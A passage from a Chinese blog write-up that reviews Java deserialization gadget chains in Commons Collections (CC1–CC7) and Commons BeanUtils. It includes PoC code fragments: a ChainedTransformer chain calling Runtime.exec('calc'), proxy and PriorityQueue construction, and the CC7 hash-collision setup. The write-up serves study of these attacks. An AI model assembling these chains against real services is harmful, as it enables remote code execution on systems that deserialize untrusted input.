title="利用ChainedTransformer"></a>利用ChainedTransformer</h3><p>​看到这里就知道，CC链中常见的ChainedTransformer，其transform符合反射执行这种“链式代码”的写法。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] x = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">d</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(x);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取到Runtime.class -&gt; 反射调用getMethod，获取到getRuntime方法 -&gt; 反射调用getRuntime的invoke方法(此时获取到Runtime类对象) -&gt; 反射执行exec(&quot;calc&quot;)</span></span><br><span class="line">简言之，先通过反射调用getRuntime，再反射调用exec。上面相当于Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);。</span><br><span class="line">这里需要注意，Runtime构造器为<span class="keyword">private</span>，是单例模式，不能直接用InstantiateTransformer。此外，也不能直接用InvokerTransformer，这需要将Runtime.getRuntime放入Map，而Runtime对象没有实现序列化接口。综上只能反射。</span><br></pre></td></tr></table></figure><h3 id="利用InvokerTransformer"><a href="#利用InvokerTransformer" class="headerlink" title="利用InvokerTransformer"></a>利用InvokerTransformer</h3><p>​InvokerTransformer提供了直接反射执行，如果传入Object实现了序列化接口，就能直接反射执行其方法。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">InvokerTransformer transformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//反射执行templatesImpl.newTransformer，只有它调用了getTransletInstance，其中以如下实例化类的操作：</span></span><br><span class="line">(AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line"><span class="comment">//而_class[i]是已被加载的_bytecodes，这里也能明白为啥Explot类需要实现AbstractTranslet接口？</span></span><br><span class="line">_class[i] = loader.defineClass(_bytecodes[i])</span><br></pre></td></tr></table></figure><h3 id="利用InstantiateTransformer"><a href="#利用InstantiateTransformer" class="headerlink" title="利用InstantiateTransformer"></a>利用InstantiateTransformer</h3><p>​InstantiateTransformer提供了实例化，如果类的构造函数中存在利用链，则能继续Gadget。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),<span class="comment">//TrAXFilter构造方法中接收一个transformer然后调用它的transformer方法</span></span><br><span class="line">    <span class="comment">//InstantiateTransformer用来实例化类，它的构造方法接收类的构造方法参数类型和参数值，transformer方法调用newInstance来实例化类</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;TemplatesImpl_instance&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//反射执行trAXFilter.TrAXFilter(templatesImpl)</span></span><br><span class="line">因为TrAXFilter类的构造函数为<span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span>，其中执行“_transformer = (TransformerImpl) templates.newTransformer();”。</span><br></pre></td></tr></table></figure><h2 id="从sink观察CC链"><a href="#从sink观察CC链" class="headerlink" title="从sink观察CC链"></a>从sink观察CC链</h2><p>​这里我们关注，“到底是什么方法调用了Transformer.transform”，虽然sink点应该是底层命令执行的位置，但在这里，我将能确定衔接transform方法的位置称为CC链的sink点。</p><p>​sink点有两种，LazyMap.get(no key)和TransformingComparator.compare。</p><h3 id="LazyMap-get-no-key"><a href="#LazyMap-get-no-key" class="headerlink" title="LazyMap.get( no key)"></a>LazyMap.get( no key)</h3><p>​LazyMap.get方法作为sink点，是因为当key值不存在时，会调用factory.transform方法，factory需满足实现Transformer接口。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Transformer factory;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.factory.transform(key);</span><br><span class="line">        <span class="built_in">super</span>.map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//LazyMap.get(not_exist_key) -&gt; ChainedTransformer.transform() -&gt; InvokerTransfomer.transform() -&gt; RCE</span></span><br><span class="line">满足条件的有</span><br></pre></td></tr></table></figure><h3 id="TransformingComparator-compare"><a href="#TransformingComparator-compare" class="headerlink" title="TransformingComparator.compare"></a>TransformingComparator.compare</h3><p>​TransformingComparator类在3.1-3.2.1版本中还没有实现Serializable接口，无法被反序列化，这条链需要commons-collections4.0。commons-collections4.0也不再有LazyMap.decorate方法了，代之LazyMap.lazyMap。</p><p>​当需要比较两个obj时，会调用transformer.transform方法。可以看到场景有限，以目前认识来看，是给优先队列这个source点量身定做的。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(I obj1, I obj2)</span> &#123;</span><br><span class="line">    <span class="type">O</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">    <span class="type">O</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// TransformingComparator.compare() -&gt; InvokerTransformer.transform() -&gt; TemplatesImpl.newTransformer() -&gt; 对TemplatesImpl._bytecodes属性进行实例化 -&gt; RCE</span></span><br><span class="line">满足条件的有</span><br></pre></td></tr></table></figure><h2 id="从source观察CC链"><a href="#从source观察CC链" class="headerlink" title="从source观察CC链"></a>从source观察CC链</h2><p>​这里我们关注，“从某个类重写的readObject方法出发，经过怎样一条Gadget能够到达“LazyMap.get或者TransformingComparator.compare方法”。source有 种，</p><h3 id="AnnotationInvocationHandler（CC1、CC3）"><a href="#AnnotationInvocationHandler（CC1、CC3）" class="headerlink" title="AnnotationInvocationHandler（CC1、CC3）"></a>AnnotationInvocationHandler（CC1、CC3）</h3><p>​AnnotationInvocationHandler类有两宝，首先实现Serializable接口，重写了readObject方法，其中会调用map的方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; memberValues;</span><br><span class="line"><span class="comment">//readObject</span></span><br><span class="line"><span class="built_in">this</span>.memberValues.entrySet().iterator()</span><br></pre></td></tr></table></figure><p>​其次，实现了InvocationHandler接口，根据动态代理可知，调用被代理对象的任何方法，都会触发invocationHandler的invoke方法，而AnnotationInvocationHandler类的invoke方法，会调用map的get方法。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//这一宝更为关键，想一下，一个动态代理InvocationHandler类，能够在invoke中存在lazyMap.get</span></span><br><span class="line"><span class="comment">//岂不是剩下只需要找个readObject中操作map的类就行</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.get(var4)</span><br></pre></td></tr></table></figure><p>​这时我们就会想到sink点LazyMap.get，假如将LazyMap绑定在hashMap上，再为增强功能的新map加上动态代理，最后将mapProxy放到AnnotationInvocationHandler的memberValues变量上，并返回annotationInvocationHandler对象。反序列化时，就会有如下Gadget:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject() -&gt; AnnotationInvocationHandler.readObject() -&gt; <span class="built_in">this</span>.memberValues.entrySet() = mapProxy.entrySet() -&gt; AnnotationInvocationHandler.invoke() -&gt; <span class="built_in">this</span>.memberValues.get(xx) = LazyMap.get(not_exist_key) -&gt; ChainedTransformer.transform() -&gt; InvokerTransfomer.transform() -&gt; RCE</span><br></pre></td></tr></table></figure><p>​可以看到，关键是annotationInvocationHandler对象的readObject方法调用了代理map的entrySet，从而触发另一个annotationInvocationHandler对象的invoke方法，其中会调用lazyMap.get。实现重点是：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取lazyMap</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">map1</span> <span class="operator">=</span> LazyMap.decorate(map, d);</span><br><span class="line"><span class="comment">//创建代理map</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">ct</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">ct.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) ct.newInstance(Target.class, map1);</span><br><span class="line"><span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br><span class="line"><span class="comment">//创建要被序列化的annotationInvocationHandler对象</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> ct.newInstance(Target.class, proxyMap);</span><br><span class="line"><span class="comment">//Target.class是满足annotationInvocationHandler构造器的要求，即继承了Annotation的类</span></span><br></pre></td></tr></table></figure><p>​对于AnnotationInvocationHandler这个source点，CC1和CC3使用，区别在CC1用ChainedTransformer实现链式反射，CC3使用InstantiateTransformer、通过TrAXFilter类的构造器，实现TemplatesImpl实例化恶意字节码。</p><h3 id="PriorityQueue（CC2、CC4）"><a href="#PriorityQueue（CC2、CC4）" class="headerlink" title="PriorityQueue（CC2、CC4）"></a>PriorityQueue（CC2、CC4）</h3><p>​TransformingComparator.compare这个sink点，是为source点PriorityQueue.readObject量身定做的，这里就分析其中的Gadget。PriorityQueue重写的readObject方法，存在一条调用链，最终会执行comparator.compare((E) c, (E) queue[right])方法。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PriorityQueue的readObject -&gt; PriorityQueue的heapify -&gt; PriorityQueue的siftDown</span><br><span class="line">    -&gt; PriorityQueue的siftDownUsingComparator -&gt; comparator.compare((E) c, (E) queue[right])</span><br></pre></td></tr></table></figure><p>​刷LeetCode时遇到“最大堆、最小堆”时通常用PriorityQueue去做，我们知道往PriorityQueue里添加元素时，堆会自动排序，这应该heapify去做的事情。然而，PriorityQueue的add方法，会调用siftUp，也会走向compare。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">queue.add(1) -&gt; siftUp(i, e) -&gt; siftUpUsingComparator -&gt; comparator.compare((E) c, (E) queue[right])</span><br></pre></td></tr></table></figure><p>​为了不在构造序列化数据时，先被自己攻击，CC2的写法是先往队列里扔两个1，最后再用TemplatesImpl替换掉。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//直接反射设置queue属性不行，必须扔这两个1，可能是为了维护好PriorityQueue的其他属性</span></span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置queue属性</span></span><br><span class="line">field=queue.getClass().getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//队列至少需要2个元素</span></span><br><span class="line">Object[] objects = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;TemplatesImpl_instance , TemplatesImpl_instance&#125;;</span><br><span class="line">field.set(queue,objects);</span><br></pre></td></tr></table></figure><p>​对于PriorityQueue这个source点，CC2和CC4使用，区别是CC2使用InvokerTransformer直接反射执行templatesImpl.newTransformer，CC4使用InstantiateTransformer反射执行TrAXFilter构造器，再执行templatesImpl.newTransformer。</p><h3 id="BadAttributeValueExpException（CC5）"><a href="#BadAttributeValueExpException（CC5）" class="headerlink" title="BadAttributeValueExpException（CC5）"></a>BadAttributeValueExpException（CC5）</h3><p>​为什么不直接找到某个类，它的readObject方法能调用lazyMap.get？BadAttributeValueExpException：很明显，我就是这种人！</p><p>​BadAttributeValueExpException重写的readObject方法，会调用对象转字符串，而TiedMapEntry类的toString方法，存在执行流到达lazyMap.get。说个马后炮，像TiedMapEntry这种Map的单元类，getValue实现肯定是由键取值，当然有map.get了。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//需要设置SecurityManager</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span>|| ... <span class="keyword">instanceof</span> ...||...) &#123;</span><br><span class="line">    val = valObj.toString();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//BadAttributeValueExpException.readObject() -&gt; TiedMapEntry.toString() -&gt; TiedMapEntry.getValue() -&gt; LazyMap.get(not_exist_key)</span></span><br><span class="line">TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;asd&quot;</span>);<span class="comment">//显然lazyMap里没有&quot;asd&quot;</span></span><br></pre></td></tr></table></figure><h3 id="HashSet（CC6）"><a href="#HashSet（CC6）" class="headerlink" title="HashSet（CC6）"></a>HashSet（CC6）</h3><p>​TiedMapEntry类的hashCode方法，也存在执行流到达lazyMap.get，而我们知道HashMap和HashSet反序列化时会调用map.put，会对键计算哈希值，这样就会调用到TiedMapEntry.hashCode方法。</p><p>​可以感觉到CC5、CC6都挺简单的，这就体现了TiedMapEntry的强大能力。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashSet.readObject() -&gt; HashMap.put() -&gt; HashMap.hash() -&gt; TiedMapEntry.hashCode() -&gt; TiedMapEntry.getValue() -&gt; LazyMap.get() -&gt; ChainedTransfomer.transform() -&gt; RCE</span><br></pre></td></tr></table></figure><h3 id="Hashtable（CC7）"><a href="#Hashtable（CC7）" class="headerlink" title="Hashtable（CC7）"></a>Hashtable（CC7）</h3><p>​先贴出CC7的Gadget：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Hashtable.readObject() -&gt; Hashtable.reconstitutionPut() -&gt; AbstractMapDecorator.equals() -&gt; AbstractMap.equals() -&gt; LazyMap.get() -&gt; ChainedTrasnformer.transform() -&gt; RCE</span><br></pre></td></tr></table></figure><p>​Hashtable反序列化时，还是要依次插入键值对，这时候由reconstitutionPut方法完成，不再是put方法。这两个方法都存在一个判断，当满足下列条件是，put会直接返回已有对象，reconstitutionPut会抛出异常。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//插入一个新键值对时，需要和hashTable中所有已经存在的元素比较</span></span><br><span class="line"><span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> hash(key);</span><br><span class="line"><span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line"><span class="keyword">for</span> (Entry&lt;K,V&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;</span><br><span class="line">    <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//e.hash，就是计算hashTable内部类Entry的hash值，其hashCode方法为</span></span><br><span class="line">Objects.hashCode(key) ^ Objects.hashCode(value)</span><br></pre></td></tr></table></figure><p>​根据下面部分POC代码，e.hash会计算Objects.hashCode(lazyMap对象) ^ Objects.hashCode(1)，而lazyMap的hash值就是内部Map.Entry的hash值累加，而”yy”和“zZ”的hashCode都是3879，则两个lazyMap对象的hash值相等。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Entry&lt;K,V&gt;的hashCode方法：Objects.hashCode(getKey()) ^ Objects.hashCode(getValue()</span></span><br><span class="line"><span class="comment">//利用链写法</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">hashMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.lazyMap(hashMap1, transformerChain);</span><br><span class="line">lazyMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.lazyMap(hashMap2, transformerChain);</span><br><span class="line">lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">hashtable.put(lazyMap2, <span class="number">1</span>);</span><br><span class="line"><span class="comment">//因为插入第二个键值对时，put也会存在链调用到lazyMap2.get，这有两点要注意</span></span><br><span class="line"><span class="comment">//1.绑定的ChainedTransformer最开始要空，避免此时factory.transform执行命令，put后再反射填入</span></span><br><span class="line"><span class="comment">//2.lazyMap.get还会调用map.put(key, value)，加入这个不存在的键，所以要构造时删掉</span></span><br><span class="line">lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br></pre></td></tr></table></figure><p>​逻辑会进入e.key.equals(key)，也就是lazyMap对象1.equals(lazyMap对象2)，沿着lazyMap的继承关系，可知最后调用了hashMap对象.equals(hashMap对象2)，进而调用了HashMap父类AbstractMap的equls方法。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//写一下类的继承关系</span></span><br><span class="line">LazyMap继承AbstractMapDecorator，将hashMap封装在AbstractMapDecorator的map属性上。而AbstractMapDecorator的equals和hashCode方法，都是调用map.equals、map.hashCode。</span><br></pre></td></tr></table></figure><p>​equals实现比较两个map对象，显然是遍历hashMap对象1的键值对，判断hashMap对象2是否存在键，值又是否相等。此时就会有map.get(key)，而lazyMap1不包含“zZ”键，从而进入sink点。</p><p>​回顾整个Gadget，是利用了readObject重建哈希表时，判断哈希冲突的位置。当e.hash&#x3D;&#x3D;hash，发生哈希冲突时，进一步用equals判断对象本质是否相等，而hashMap判断本质相等时，会挨个比较键值对，就存在由键取值，从而触发lazyMap.get(no key)。</p><h3 id="CommonsBeanutils"><a href="#CommonsBeanutils" class="headerlink" title="CommonsBeanutils"></a>CommonsBeanutils</h3><p>​Shiro 框架本身只引入了 common-beanutils，需要只依赖common-beanutils实现RCE。在CC2链中，通过TransformingComparator.compare调用Transformer接口的transform方法，那么是否存在替代品?</p><p>​从底层看CC链，只有两种方式命令执行：InvokerTransformer和TemplatesImpl。CB链不能依赖commons-collections库，就不能从InvokerTransformer，而是直接从TemplatesImpl实例化_bytescode字节码出发，TemplatesImpl类是这样的：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//getTransletInstance方法</span></span><br><span class="line">私有方法，执行(AbstractTranslet) _class[_transletIndex].newInstance()。</span><br><span class="line"><span class="comment">//newTransformer方法</span></span><br><span class="line"><span class="keyword">public</span>方法，调用getTransletInstance方法。</span><br><span class="line"><span class="comment">//getOutputProperties方法</span></span><br><span class="line"><span class="keyword">public</span>方法，调用newTransformer方法</span><br></pre></td></tr></table></figure><p>​CB链的关键在，commons-beanutils库中提供了一个静态方法PropertyUtils.getProperty，让使用者可以直接调用任意JavaBean的getter方法。而commons-beanutils库的BeanComparator比较器，其compare方法会调用PropertyUtils.getProperty。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//PropertyUtils.getProperty</span></span><br><span class="line"><span class="comment">//就是根据“outputProperties”获取descriptor，找到getOutputProperties方法，并反射执行</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">readMethod</span> <span class="operator">=</span> <span class="built_in">this</span>.getReadMethod(bean.getClass(), descriptor);</span><br><span class="line"><span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.invokeMethod(readMethod, bean, EMPTY_OBJECT_ARRAY);</span><br><span class="line"></span><br><span class="line"><span class="comment">//BeanComparator.compare(Object o1, Object o2)</span></span><br><span class="line"><span class="keyword">private</span> String property;</span><br><span class="line"><span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> PropertyUtils.getProperty(o1, <span class="built_in">this</span>.property);</span><br></pre></td></tr></table></figure><p>​思路就很明确了，反射修改BeanComparator的property属性为“outputProperties”，将TemplatesImpl对象绑定在PriorityQueue，比较器使用BeanComparator，编写POC代码时要注意先往队列里扔两个1，最后再用TemplatesImpl替换掉。</p><h2 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h2><p>​贴一下kingkk师傅的总结：</p><p>​一般来说，CC4和CC6无法利用，就表示4.0和3.1的gadget不存在。</p><ul><li>CC1:针对<code>commons-collections3.1</code>前面也提到过了，对于高版本的jdk8是不能用的，那具体是多高呢，我也不清楚，总之本地测试是<code>jdk8_u40</code>是可以利用的，<code>jdk8_u112</code>是无法利用的。所以总体来说，可以利用的版本还是比较低的。</li><li>CC2:针对<code>commons-collections4.0</code>，比较好的一个触发链，11的版本中都可以用.</li><li>CC3:针对<code>commons-collections3.1</code>，和CC1一样，前面也是调用的<code>AnnotationInvocationHandler</code>动态代理，导致1不能用的同时3也一样无法利用。</li><li>CC4:针对<code>commons-collections4.0</code>，也是一样都可以触发。</li><li>CC5:针对<code>commons-collections3.1</code>，由于将1中的<code>AnnotationInvocationHandler</code>变成了<code>BadAttributeValueExpException</code><br>从而解决了1中无法利用的问题。</li><li>CC6:针对<code>commons-collections3.1</code>，前半部分的触发链根据HashSet而来，从而也没有了版本限制。</li><li>CC7:针对<code>commons-collections3.1</code>，前半部分的触发链根据HashTable而来，从而也没有了版本限制。</li><li>CB:针对common-beanutils，不依赖commons-collections，但jdk7某版本未成功，jdk8u121能成功。</li></ul><h2 id="感慨"><a href="#感慨" class="headerlink" title="感慨"></a>感慨</h2><p>​时隔两年回过头来再看CC链，曾经半个月看得糊里糊涂，现在能在一天内整理成文章输出，其中必然有成长。但是，“拔剑四顾心茫然”的感觉，不断撕扯着我，远去的时光如同一剂苦药，让我终于具备快速学习的能力后，不再想消耗自己。或许，就像磊哥离开时说的，“我已经看到了Java安全的顶点，它不符合我的预期，我不想继续了”，钻石似乎早就被捡光了，现在就是会开挖掘机也不会有丰厚的回报。就这样吧，做一个努力冲向面试的安全开发仔也很好~</p><h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//URLDNS</span></span><br><span class="line">HashMap.readObject() -&gt; HashMap.putVal() -&gt; HashMap.hash() -&gt;URL.hashCode()</span><br><span class="line">        </span><br><span class="line"><span class="comment">//CC1</span></span><br><span class="line">ObjectInputStream.readObject() -&gt; AnnotationInvocationHandler.readObject() -&gt; <span class="built_in">this</span>.memberValues.entrySet() = mapProxy.entrySet() -&gt; AnnotationInvocationHandler.invoke() -&gt; <span class="built_in">this</span>.memberValues.get(xx) = LazyMap.get(not_exist_key) -&gt; ChainedTransformer.transform() -&gt; InvokerTransfomer.transform() -&gt; RCE</span><br><span class="line"><span class="comment">//CC2</span></span><br><span class="line">ObjectInputStream.readObject() -&gt; PriorityQueue.readObject() -&gt; 【TemplatesImpl.readObject()】 -&gt; PriorityQueue.heapify() -&gt; TransformingComparator.compare() -&gt; InvokerTransformer.transform() -&gt; TemplatesImpl.newTransformer() -&gt; 对TemplatesImpl._bytecodes属性进行实例化 -&gt; RCE </span><br><span class="line"><span class="comment">//CC3</span></span><br><span class="line">ObjectInputStream.readObject() -&gt; AnnotationInvocationHandler.readObject() -&gt; <span class="built_in">this</span>.memberValues.entrySet() = mapProxy.entrySet() -&gt; AnnotationInvocationHandler.invoke() -&gt; <span class="built_in">this</span>.memberValues.get(xx) = LazyMap.get(not_exist_key) -&gt; ChainedTransformer.transform() -&gt; InstantiateTransformer.transform() -&gt; TrAXFilter.TrAXFilter() -&gt; TemplatesImpl.newTransformer() -&gt; _bytecodes实例化 -&gt; RCE</span><br><span class="line"><span class="comment">//CC4</span></span><br><span class="line">TransformingComparator.compare() -&gt; InvokerTransformer.transform() -&gt; TemplatesImpl.newTransformer() -&gt; 对TemplatesImpl._bytecodes属性进行实例化</span><br><span class="line">TransformingComparator.compare() -&gt; ChainedTransformer.transform() -&gt; InstantiateTransformer.transform() -&gt; TrAXFilter.TrAXFilter() -&gt; TemplatesImpl.newTransformer() -&gt; _bytecodes实例化 -&gt; RCE</span><br><span class="line"><span class="comment">//CC5</span></span><br><span class="line">BadAttributeValueExpException.readObject() -&gt; TiedMapEntry.toString() -&gt; TiedMapEntry.getValue() -&gt; LazyMap.get(not_exist_key) -&gt; ChainedTransformer.transform() -&gt; RCE</span><br><span class="line"><span class="comment">//CC6</span></span><br><span class="line">HashSet.readObject() -&gt; HashMap.put() -&gt; HashMap.hash() -&gt; TiedMapEntry.hashCode() -&gt; TiedMapEntry.getValue() -&gt; LazyMap.get() -&gt; ChainedTransfomer.transform() -&gt; RCE</span><br><span class="line"><span class="comment">//CC7</span></span><br><span class="line">Hashtable.readObject() -&gt; Hashtable.reconstitutionPut() -&gt; AbstractMapDecorator.equals() -&gt; AbstractMap.equals() -&gt; LazyMap.get() -&gt; ChainedTrasnformer.transform() -&gt; RCE</span><br><span class="line"><span class="comment">//CCB</span></span><br><span class="line">ObjectInputStream.readObject() -&gt; PriorityQueue.readObject() -&gt; 【TemplatesImpl.readObject()】 -&gt; PriorityQueue.heapify() -&gt; BeanComparator.compare() -&gt; PropertyUtils.getProperty() -&gt; TemplatesImpl.getOutputProperties() -&gt; TemplatesImpl.newTransformer() -&gt; _bytecodes实例化 -&gt; RCE</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复习篇 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpenRASP再探类加载</title>
      <link href="/2023/02/22/OpenRASP%E5%86%8D%E6%8E%A2%E7%B1%BB%E5%8A%A0%E8%BD%BD/"/>
      <url>/2023/02/22/OpenRASP%E5%86%8D%E6%8E%A2%E7%B1%BB%E5%8A%A0%E8%BD%BD/</url>
      
